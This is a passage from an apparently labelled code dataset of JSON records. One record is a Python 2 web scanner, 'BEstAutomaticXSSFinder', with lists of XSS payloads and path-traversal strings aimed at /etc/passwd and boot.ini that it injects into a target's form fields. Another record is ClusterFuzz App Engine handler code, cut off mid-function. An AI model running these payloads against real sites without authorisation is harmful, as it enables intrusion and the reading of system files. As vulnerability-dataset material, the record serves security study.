  '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',\n                '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00',\n                '../../../../../boot.ini%00', '../../../../../../boot.ini%00',\n                '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00',\n                '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini'\n                ]\n\nlfi_expect = ['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin']\n\ndef check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):\n    global xss_attacks\n    global DEBUG\n    if page.find(\"http://\") == 0 or page.find(\"https://\") == 0:\n        furl = page\n    else:\n        if _url.find(\"https://\") == 0:\n            furl = \"https://\" + host + \"/\" + page\n        else:\n            furl = \"http://\" + host + \"/\" + page\n\n    print \"[+] XSS check for: \" + furl\n    if DEBUG == 1:\n        print \"Params: \"\n        print params\n        print hidden_param_name\n        print hidden_param_value\n\n    counter = 0\n    for xss in xss_attacks:\n        post_params={}\n        counter+=1\n        parameters = \"\"\n        for i in range(0,len(params)):\n            for j in range(0, len(params)):\n                if j==i:\n                    post_params[params[j]] = xss\n                else:\n                    post_params[params[j]] = 0\n\n        #add any hidden parameters\n        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):\n            for i in range(0,len(hidden_param_name)):\n                post_params[hidden_param_name[i]] = hidden_param_value[i]\n\n        if method.find(\"get\") == 0:\n            r=requests.get(url = furl, params = post_params)\n        else:\n            r=requests.post(furl, data=post_params)\n\n        if DEBUG == 1:\n            print post_params\n            with open(\"response_\" + str(form_counter) + \"_\" + str(counter) + \".html\", \"w\") as f:\n                f.write(r.content)\n\n        if r.content.find(xss)>=0:\n            print \"[+] Target is VULNERABLE\"\n            print \"Url: \" + url\n            print \"Parameters: %s\\n\" % str(post_params)\n\n            #comment out the return if you want all the findings\n            return\n    return\n\ndef check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):\n    global lfi_attacks\n    global lfi_expect\n    global DEBUG\n    if page.find(\"http://\") == 0 or page.find(\"https://\") == 0:\n        furl = page\n    else:\n        if _url.find(\"https://\") == 0:\n            furl = \"https://\" + host + \"/\" + page\n        else:\n            furl = \"http://\" + host + \"/\" + page\n\n    print \"[+] LFI check for: \" + furl\n    if DEBUG == 1:\n        print \"Params: \"\n        print params\n        print hidden_param_name\n        print hidden_param_value\n\n    counter = 0\n    for lfi in lfi_attacks:\n        post_params={}\n        counter+=1\n        parameters = \"\"\n        for i in range(0,len(params)):\n            for j in range(0, len(params)):\n                if j==i:\n                    post_params[params[j]] = lfi\n                else:\n                    post_params[params[j]] = 0\n\n        #add any hidden parameters\n        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):\n            for i in range(0,len(hidden_param_name)):\n                post_params[hidden_param_name[i]] = hidden_param_value[i]\n\n        if method.find(\"get\") == 0:\n            r=requests.get(url = furl, params = post_params)\n        else:\n            r=requests.post(furl, data=post_params)\n\n        if DEBUG == 1:\n            print post_params\n            with open(\"response_\" + str(form_counter) + \"_\" + str(counter) + \".html\", \"w\") as f:\n                f.write(r.content)\n\n        for lfi_result in lfi_expect:\n            if r.content.find(lfi_result)>=0:\n                print \"[+] Target is VULNERABLE\"\n                print \"Url: \" + url\n                print \"Parameters: %s\\n\" % str(post_params)\n\n                #comment out the return if you want all the findings\n                return\n    return\n\n\ndef scan_for_forms(fname, host, url, scanopt):\n    print \"[+] Start scan\"\n    rtype=\"\"\n    has_form=0\n    params = []\n    hidden_param_name=[]\n    hidden_param_value=[]\n    page = \"\"\n    form_counter = 0\n\n    try:\n        with open(fname, \"r\") as f:\n            for line in f:\n\n                #now that we've collected all the parameters\n                #let's check if the page is vulnerable\n                if line.find(\"</form>\") >=0:\n                    has_form=0\n                    if len(page) > 0 and (len(params) > 0 or len(hidden_param_value) > 0):\n                        if scanopt.find(\"--checkxss\") == 0 or scanopt.find(\"--all\") == 0:\n                            check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n                        if scanopt.find(\"--checklfi\") == 0 or scanopt.find(\"--all\") == 0:\n                            check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n                        params=[]\n                        hidden_param_name=[]\n                        hidden_param_value=[]\n                        page=\"\"\n\n                #add input parameters to list\n                if has_form == 1:\n                    m_input = re.match(r'.*\\<(input|button)\\s[^\\>]*name=[\"\\'](\\w+)[\"\\']', line, re.M|re.I)\n                    if m_input:\n                        #check if the parameters already has a value assigned\n                        m_value = re.match(r'.*\\<(input|button)\\s[^\\>]*value=[\"\\'](\\w+)[\"\\']', line, re.M|re.I)\n                        if m_value:\n                            hidden_param_name.append(m_input.group(2))\n                            hidden_param_value.append(m_value.group(2))\n                        else:\n                            params.append(m_input.group(2))\n\n                #detect forms\n                m_same      = re.match(r'.*\\<form\\>', line, re.M|re.I)\n                m_action    = re.match(r'.*\\<form\\s[^\\>]*action=[\"\\']([\\w\\/\\.\\-\\#\\:]+)[\"\\']', line, re.M|re.I)\n                m_reqtype   = re.match(r'.*\\<form\\s[^\\>]*method=[\"\\']([\\w\\/\\.\\-]+)[\"\\']', line, re.M|re.I)\n                if m_action or m_same:\n                    has_form=1\n                    form_counter+=1\n                    if m_same:\n                        page=\"\"\n                    else:\n                        page=m_action.group(1)\n                    rtype=\"get\"\n                    if m_reqtype:\n                        rtype=m_reqtype.group(1)\n                    print \"[+] Form detected. Method \" + rtype.upper()\n\n    except Exception, e:\n        print \"[-] scan_for_forms(): Error \" + str(e)\n\n        #enable the following lines if you want more details\n        #exc_type, exc_obj, exc_tb = sys.exc_info()\n        #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]\n        #print(exc_type, fname, exc_tb.tb_lineno)\n\n    return\n\ndef help():\n    print \"--checkxss\\t\\tcheck webpage for XSS vunerabilities\"\n    print \"--checklfi\\t\\tcheck webpage for local file inclusion (LFI) vulnerabilities\"\n    print \"--all\\t\\t\\tthe tool will scan for both XSS and LFI vulnerabilities (default)\"\n    print \"\\nExamples:\"\n    print \"program http://example.com/guestbook\\t\\t\\tit will check for both XSS and LFI\"\n    print \"program --checkxss http://example.com/guestbook\\t\\tit will check only for XSS\"\n\n###MAIN###\nif __name__ == \"__main__\":\n    print \"BEstAutomaticXSSFinder v1.0\"\n    print \"DISCLAIMER: For testing purposes only!\\n\"\n\n    if len(sys.argv) < 2 or len(sys.argv) > 3:\n        print \"program [scan options] [url]\\n\"\n        help()\n        exit()\n\n    scanopt =\"--all\"\n    url = \"\"\n    \n    if sys.argv[1].find(\"http\") == 0:\n        url = sys.argv[1]\n        if len(sys.argv) == 3:\n            scanopt = sys.argv[2]\n    else:\n        if len(sys.argv) == 3:\n            if sys.argv[1].find(\"--check\") == 0:\n                scanopt = sys.argv[1]\n                url = sys.argv[2]\n\n    if url.find(\"http\") != 0:\n        print \"[-] Invalid target\"\n        exit()\n\n    m=re.match(r'(http|https):\\/\\/([^\\/]+)', url, re.I|re.M)\n    if m:\n        host = m.group(2)\n    else:\n        print \"[-] Can't get host information\"\n        exit()\n\n    print \"[+] Host acquired \" + host\n    print \"[+] Retrieve page\"\n    try:\n        r = requests.get(url)\n        s = r.content.replace(\">\", \">\\n\")\n\n        #good to have a local copy for testing\n        with open(\"tmpage.txt\", \"w\") as f:\n            f.write(s)\n\n        scan_for_forms(\"tmpage.txt\", host, url, scanopt)\n        if DEBUG == 0:\n            os.remove(\"tmpage.txt\")\n    except Exception, e:\n        print \"[-] Main(): Error \" + str(e)\n\nprint \"[*] Done\"\n/n/n/n", "label": 0}, {"id": "73d12b579a488013c561179bb95b1d45c2b48e2f", "code": "/scripts/beaxssf.py/n/n#! python\n###############################################\n#   BEstAutomaticXSSFinder                    #\n#   Author: malwrforensics                    #\n#   Contact: malwr at malwrforensics dot com  #\n###############################################\n\nimport sys\nimport os\nimport requests\nimport re\n\nDEBUG = 0\nxss_attacks = [ \"<script>alert(1);</script>\", \"<img src=x onerror=prompt(/test/)>\",\n                \"\\\"><script>alert(1);</script><div id=\\\"x\", \"</script><script>alert(1);</script>\",\n                \"</title><script>alert(1);</script>\", \"<body background=\\\"javascript:alert(1)\\\">\",\n                \"<img src=test123456.jpg onerror=alert(1)>\"]\n\nlfi_attacks = [\n                #linux\n                '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',\n                '../../../../../etc/passwd', '../../../../../../etc/passwd',\n                '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd',\n                '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n                '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00',\n                '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00',\n                '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00',\n                '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',\n\n                #windows\n                '../../boot.ini', '../../../boot.ini', '../../../../boot.ini',\n                '../../../../../boot.ini', '../../../../../../boot.ini',\n                '../../../../../../../boot.ini', '../../../../../../../../boot.ini',\n                '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',\n                '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00',\n                '../../../../../boot.ini%00', '../../../../../../boot.ini%00',\n                '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00',\n                '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini'\n                ]\n\nlfi_expect = ['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin']\n\ndef check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):\n    global xss_attacks\n    global DEBUG\n    if page.find(\"http://\") == 0 or page.find(\"https://\") == 0:\n        furl = page\n    else:\n        if _url.find(\"https://\") == 0:\n            furl = \"https://\" + host + \"/\" + page\n        else:\n            furl = \"http://\" + host + \"/\" + page\n\n    print \"[+] XSS check for: \" + furl\n    if DEBUG == 1:\n        print \"Params: \"\n        print params\n        print hidden_param_name\n        print hidden_param_value\n\n    counter = 0\n    for xss in xss_attacks:\n        post_params={}\n        counter+=1\n        parameters = \"\"\n        for i in range(0,len(params)):\n            for j in range(0, len(params)):\n                if j==i:\n                    post_params[params[j]] = xss\n                else:\n                    post_params[params[j]] = 0\n\n        #add any hidden parameters\n        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):\n            for i in range(0,len(hidden_param_name)):\n                post_params[hidden_param_name[i]] = hidden_param_value[i]\n\n        if method.find(\"get\") == 0:\n            r=requests.get(url = furl, params = post_params)\n        else:\n            r=requests.post(furl, data=post_params)\n\n        if DEBUG == 1:\n            print post_params\n            with open(\"response_\" + str(form_counter) + \"_\" + str(counter) + \".html\", \"w\") as f:\n                f.write(r.content)\n\n        if r.content.find(xss)>=0:\n            print \"[+] Target is VULNERABLE\"\n            print \"Url: \" + url\n            print \"Parameters: %s\\n\" % str(post_params)\n\n            #comment out the return if you want all the findings\n            return\n    return\n\ndef check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):\n    global lfi_attacks\n    global lfi_expect\n    global DEBUG\n    if page.find(\"http://\") == 0 or page.find(\"https://\") == 0:\n        furl = page\n    else:\n        if _url.find(\"https://\") == 0:\n            furl = \"https://\" + host + \"/\" + page\n        else:\n            furl = \"http://\" + host + \"/\" + page\n\n    print \"[+] LFI check for: \" + furl\n    if DEBUG == 1:\n        print \"Params: \"\n        print params\n        print hidden_param_name\n        print hidden_param_value\n\n    counter = 0\n    for lfi in lfi_attacks:\n        post_params={}\n        counter+=1\n        parameters = \"\"\n        for i in range(0,len(params)):\n            for j in range(0, len(params)):\n                if j==i:\n                    post_params[params[j]] = lfi\n                else:\n                    post_params[params[j]] = 0\n\n        #add any hidden parameters\n        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):\n            for i in range(0,len(hidden_param_name)):\n                post_params[hidden_param_name[i]] = hidden_param_value[i]\n\n        if method.find(\"get\") == 0:\n            r=requests.get(url = furl, params = post_params)\n        else:\n            r=requests.post(furl, data=post_params)\n\n        if DEBUG == 1:\n            print post_params\n            with open(\"response_\" + str(form_counter) + \"_\" + str(counter) + \".html\", \"w\") as f:\n                f.write(r.content)\n\n        for lfi_result in lfi_expect:\n            if r.content.find(lfi_result)>=0:\n                print \"[+] Target is VULNERABLE\"\n                print \"Url: \" + url\n                print \"Parameters: %s\\n\" % str(post_params)\n\n                #comment out the return if you want all the findings\n                return\n    return\n\n\ndef scan_for_forms(fname, host, url):\n    print \"[+] Start scan\"\n    rtype=\"\"\n    has_form=0\n    params = []\n    hidden_param_name=[]\n    hidden_param_value=[]\n    page = \"\"\n    form_counter = 0\n    try:\n        with open(fname, \"r\") as f:\n            for line in f:\n\n                #now that we've collected all the parameters\n                #let's check if the page is vulnerable\n                if line.find(\"</form>\") >=0:\n                    has_form=0\n                    if len(page) > 0 and len(params) > 0:\n                        check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n                        check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n                        params=[]\n                        hidden_param_name=[]\n                        hidden_param_value=[]\n                        page=\"\"\n\n                #add input parameters to list\n                if has_form == 1:\n                    m_input = re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I)\n                    if m_input:\n                        #check if the parameters already has a value assigned\n                        m_value = re.match(r'.*\\<(input|button)\\s[^\\>]*value=\"(\\w+)\"', line, re.M|re.I)\n                        if m_value:\n                            hidden_param_name.append(m_input.group(2))\n                            hidden_param_value.append(m_value.group(2))\n                        else:\n                            params.append(m_input.group(2))\n\n                #detect forms\n                m_same      = re.match(r'.*\\<form\\>\"', line, re.M|re.I)\n                m_action    = re.match(r'.*\\<form\\s[^\\>]*action=\"([\\w\\/\\.\\-\\#\\:]+)\"', line, re.M|re.I)\n                m_reqtype   = re.match(r'.*\\<form\\s[^\\>]*method=\"([\\w\\/\\.\\-]+)\"', line, re.M|re.I)\n                if m_action or m_same:\n                    has_form=1\n                    form_counter+=1\n                    if m_same:\n                        page=\"\"\n                    else:\n                        page=m_action.group(1)\n                    rtype=\"get\"\n                    if m_reqtype:\n                        rtype=m_reqtype.group(1)\n                    print \"[+] Form detected. Method \" + rtype.upper()\n\n    except Exception, e:\n        print \"[-] scan_for_forms(): Error \" + str(e)\n\n        #enable the following lines if you want more details\n        #exc_type, exc_obj, exc_tb = sys.exc_info()\n        #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]\n        #print(exc_type, fname, exc_tb.tb_lineno)\n\n    return\n\ndef banner():\n    print \"BEstAutomaticXSSFinder v1.0\"\n    print \"DISCLAIMER: For testing purposes only!\\n\"\n\n###MAIN###\nif __name__ == \"__main__\":\n    banner()\n\n    if len(sys.argv) != 2:\n        print \"program [url]\"\n        exit()\n\n    url = sys.argv[1]\n    if url.find(\"http\") != 0:\n        print \"[-] Invalid target\"\n        exit()\n\n    m=re.match(r'(http|https):\\/\\/([^\\/]+)', url, re.I|re.M)\n    if m:\n        host = m.group(2)\n    else:\n        print \"[-] Can't get host information\"\n        exit()\n\n    print \"[+] Host acquired \" + host\n    print \"[+] Retrieve page\"\n    try:\n        r = requests.get(url)\n        s = r.content.replace(\">\", \">\\n\")\n\n        #good to have a local copy for testing\n        with open(\"tmpage.txt\", \"w\") as f:\n            f.write(s)\n\n        scan_for_forms(\"tmpage.txt\", host, url)\n        os.remove(\"tmpage.txt\")\n    except Exception, e:\n        print \"[-] Main(): Error \" + str(e)\n\nprint \"[*] Done\"\n/n/n/n", "label": 1}, {"id": "3d66c1146550eecd4e34d47332a8616b435a21fe", "code": "src/appengine/handlers/base_handler.py/n/n# Copyright 2019 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"The superclass of all handlers.\"\"\"\n\nfrom builtins import object\nfrom future import standard_library\nstandard_library.install_aliases()\nimport base64\nimport cgi\nimport datetime\nimport json\nimport logging\nimport os\nimport re\nimport sys\nimport traceback\nimport urllib.parse\n\nimport jinja2\nimport webapp2\n\nfrom base import utils\nfrom config import db_config\nfrom config import local_config\nfrom datastore import ndb\nfrom google_cloud_utils import storage\nfrom libs import auth\nfrom libs import form\nfrom libs import helpers\nfrom system import environment\n\n# Pattern from\n# https://github.com/google/closure-library/blob/\n# 3037e09cc471bfe99cb8f0ee22d9366583a20c28/closure/goog/html/safeurl.js\n_SAFE_URL_PATTERN = re.compile(\n    r'^(?:(?:https?|mailto|ftp):|[^:/?#]*(?:[/?#]|$))', flags=re.IGNORECASE)\n\n\ndef add_jinja2_filter(name, fn):\n  _JINJA_ENVIRONMENT.filters[name] = fn\n\n\nclass JsonEncoder(json.JSONEncoder):\n  \"\"\"Json encoder.\"\"\"\n  _EPOCH = datetime.datetime.utcfromtimestamp(0)\n\n  def default(self, obj):  # pylint: disable=arguments-differ,method-hidden\n    if isinstance(obj, ndb.Model):\n      dict_obj = obj.to_dict()\n      dict_obj['id'] = obj.key.id()\n      return dict_obj\n    elif isinstance(obj, datetime.datetime):\n      return int((obj - self._EPOCH).total_seconds())\n    elif hasattr(obj, 'to_dict'):\n      return obj.to_dict()\n    elif isinstance(obj, cgi.FieldStorage):\n      return str(obj)\n    else:\n      raise Exception('Cannot serialise %s' % obj)\n\n\ndef format_time(dt):\n  \"\"\"Format datetime object for display.\"\"\"\n  return '{t.day} {t:%b} {t:%y} {t:%X} PDT'.format(t=dt)\n\n\ndef splitlines(text):\n  \"\"\"Split text into lines.\"\"\"\n  return text.splitlines()\n\n\ndef split_br(text):\n  return re.split(r'\\s*<br */>\\s*', text, flags=re.IGNORECASE)\n\n\ndef encode_json(value):\n  \"\"\"Dump base64-encoded JSON string (to avoid XSS).\"\"\"\n  return base64.b64encode(json.dumps(value, cls=JsonEncoder))\n\n\n_JINJA_ENVIRONMENT = jinja2.Environment(\n    loader=jinja2.FileSystemLoader(\n        os.path.join(os.path.dirname(__file__), '..', 'templates')),\n    extensions=['jinja2.ext.autoescape'],\n    autoescape=True)\n_MENU_ITEMS = []\n\nadd_jinja2_filter('json', encode_json)\nadd_jinja2_filter('format_time', format_time)\nadd_jinja2_filter('splitlines', splitlines)\nadd_jinja2_filter('split_br', split_br)\nadd_jinja2_filter('polymer_tag', lambda v: '{{%s}}' % v)\n\n\ndef add_menu(name, href):\n  \"\"\"Add menu item to the main navigation.\"\"\"\n  _MENU_ITEMS.append(_MenuItem(name, href))\n\n\ndef make_login_url(dest_url):\n  \"\"\"Make the switch account url.\"\"\"\n  return '/login?' + urllib.parse.urlencode({'dest': dest_url})\n\n\ndef make_logout_url(dest_url):\n  \"\"\"Make the switch account url.\"\"\"\n  return '/logout?' + urllib.parse.urlencode({\n      'csrf_token': form.generate_csrf_token(),\n      'dest': dest_url,\n  })\n\n\ndef check_redirect_url(url):\n  \"\"\"Check redirect URL is safe.\"\"\"\n  if not _SAFE_URL_PATTERN.match(url):\n    raise helpers.EarlyExitException('Invalid redirect.', 403)\n\n\nclass _MenuItem(object):\n  \"\"\"A menu item used for rendering an item in the main navigation.\"\"\"\n\n  def __init__(self, name, href):\n    self.name = name\n    self.href = href\n\n\nclass Handler(webapp2.RequestHandler):\n  \"\"\"A superclass for all handlers. It contains many convenient methods.\"\"\"\n\n  def is_cron(self):\n    \"\"\"Return true if the request is from a cron job.\"\"\"\n    return bool(self.request.headers.get('X-Appengine-Cron'))\n\n  def render_forbidden(self, message):\n    \"\"\"Write HTML response for 403.\"\"\"\n    login_url = make_login_url(dest_url=self.request.url)\n    user_email = helpers.get_user_email()\n    if not user_email:\n      self.redirect(login_url)\n      return\n\n    contact_string = db_config.get_value('contact_string')\n    template_values = {\n        'message': message,\n        'user_email': helpers.get_user_email(),\n        'login_url': login_url,\n        'switch_account_url': login_url,\n        'logout_url': make_logout_url(dest_url=self.request.url),\n        'contact_string': contact_string,\n    }\n    self.render('error-403.html', template_values, 403)\n\n  def _add_security_response_headers(self):\n    \"\"\"Add security-related headers to response.\"\"\"\n    self.response.headers['Strict-Transport-Security'] = (\n        'max-age=2592000; includeSubdomains')\n    self.response.headers['X-Content-Type-Options'] = 'nosniff'\n    self.response.headers['X-Frame-Options'] = 'deny'\n\n  def render(self, path, values=None, status=200):\n    \"\"\"Write HTML response.\"\"\"\n    if values is None:\n      values = {}\n\n    values['menu_items'] = _MENU_ITEMS\n    values['is_oss_fuzz'] = utils.is_oss_fuzz()\n    values['is_development'] = (\n        environment.is_running_on_app_engine_development())\n    values['is_logged_in'] = bool(helpers.get_user_email())\n\n    # Only track analytics for non-admin users.\n    values['ga_tracking_id'] = (\n        local_config.GAEConfig().get('ga_tracking_id')\n        if not auth.is_current_user_admin() else None)\n\n    if values['is_logged_in']:\n      values['switch_account_url'] = make_login_url(self.request.url)\n      values['logout_url'] = make_logout_url(dest_url=self.request.url)\n\n    template = _JINJA_ENVIRONMENT.get_template(path)\n\n    self._add_security_response_headers()\n    self.response.headers['Content-Type'] = 'text/html'\n    self.response.out.write(template.render(values))\n    self.response.set_status(status)\n\n  def before_render_json(self, values, status):\n    \"\"\"A hook for modifying values before render_json.\"\"\"\n\n  def render_json(self, values, status=200):\n    \"\"\"Write JSON response.\"\"\"\n    self._add_security_response_headers()\n    self.response.headers['Content-Type'] = 'application/json'\n    self.before_render_json(values, status)\n    self.response.out.write(json.dumps(values, cls=JsonEncoder))\n    self.response.set_status(status)\n\n  def handle_exception(self, exception, _):\n    \"\"\"Catch exception and format it properly.\"\"\"\n    try:\n\n      status = 500\n      values = {\n          'message': exception.message,\n          'email': helpers.get_user_email(),\n          'traceDump': traceback.format_exc(),\n          'status': status,\n          'type': exception.__class__.__name__\n      }\n      if isinstance(exception, helpers.EarlyExitException):\n        status = exception.status\n        values = exception.to_dict()\n      values['params'] = self.request.params.dict_of_lists()\n\n      # 4XX is not our fault. Therefore, we hide the trace dump and log on\n      # the INFO level.\n      if status >= 400 and status <= 499:\n        logging.info(json.dumps(values, cls=JsonEncoder))\n        del values['traceDump']\n      else:  # Other error codes should be logged with the EXCEPTION level.\n        logging.exception(exception)\n\n      if helpers.should_render_json(\n          self.request.headers.get('accept', ''),\n          self.response.headers.get('Content-Type')):\n        self.render_json(values, status)\n      else:\n        if status == 403 or status == 401:\n          self.render_forbidden(exception.message)\n        else:\n          self.render('error.html', values, status)\n    except Exception:\n      self.handle_exception_exception()\n\n  def handle_exception_exception(self):\n    \"\"\"Catch exception in handle_exception and format it properly.\"\"\"\n    exception = sys.exc_info()[1]\n    values = {'message': exception.message, 'traceDump': traceback.format_exc()}\n    logging.exception(exception)\n    if helpers.should_render_json(\n        self.request.headers.get('accept', ''),\n        self.response.headers.get('Content-Type')):\n      self.render_json(values, 500)\n    else:\n      self.render('error.html', values, 500)\n\n  def redirect(self, url, **kwargs):\n    \"\"\"Explicitly converts url to 'str', because webapp2.RequestHandler.redirect\n    strongly requires 'str' but url might be an unicode string.\"\"\"\n    url = str(url)\n    check_redirect_url(url)\n    super(Handler, self).redirect(url, **kwargs)\n\n\nclass GcsUploadHandler(Handler):\n  \"\"\"A handler which uploads files to GCS.\"\"\"\n\n  def __init__(self, request, response):\n    self.initialize(request, response)\n    self.upload = None\n\n  def get_upload(self):\n    \"\"\"Get uploads.\"\"\"\n    if self.upload:\n      return self.upload\n\n    upload_key = self.request.get('upload_key')\n    if not upload_key:\n      return None\n\n    blob_info = storage.GcsBlobInfo.from_key(upload_key)\n    if not blob_info:\n      raise helpers.EarlyExitException('Failed to upload.', 500)\n\n    self.upload = blob_info\n    return self.upload\n/n/n/nsrc/appengine/handlers/login.py/n/n# Copyright 2019 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"Login page.\"\"\"\n\nimport datetime\n\nfrom config import local_config\nfrom handlers import base_handler\nfrom libs import auth\nfrom libs import handler\nfrom libs import helpers\nfrom metrics import logs\n\nSESSION_EXPIRY_DAYS = 14\n\n\nclass Handler(base_handler.Handler):\n  \"\"\"Login page.\"\"\"\n\n  @handler.unsupported_on_local_server\n  @handler.get(handler.HTML)\n  def get(self):\n    \"\"\"Handle a get request.\"\"\"\n    dest = self.request.get('dest')\n    base_handler.check_redirect_url(dest)\n\n    self.render(\n        'login.html', {\n            'apiKey': local_config.ProjectConfig().get('firebase.api_key'),\n            'authDomain': auth.auth_domain(),\n            'dest': dest,\n        })\n\n\nclass SessionLoginHandler(base_handler.Handler):\n  \"\"\"Session login handler.\"\"\"\n\n  @handler.post(handler.JSON, handler.JSON)\n  def post(self):\n    \"\"\"Handle a post request.\"\"\"\n    id_token = self.request.get('idToken')\n    expires_in = datetime.timedelta(days=SESSION_EXPIRY_DAYS)\n    try:\n     